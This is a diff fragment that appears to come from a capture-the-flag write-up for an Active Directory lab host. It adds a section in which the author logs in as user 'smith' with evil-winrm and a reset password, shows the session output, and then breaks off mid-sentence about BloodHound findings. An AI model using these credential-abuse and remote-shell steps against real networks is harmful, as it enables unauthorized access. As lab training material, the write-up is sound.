@@ -410,3 +410,17 @@ Ill start by uploading powerview
 ```
 This changed `smith` password
 
+## Compromising `smith`
+```python
+evil-winrm -i object.local -u smith -p 'Password1234!'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\smith\Documents> 
+```
+So after looking back at bloodhound this user is also part of remote me
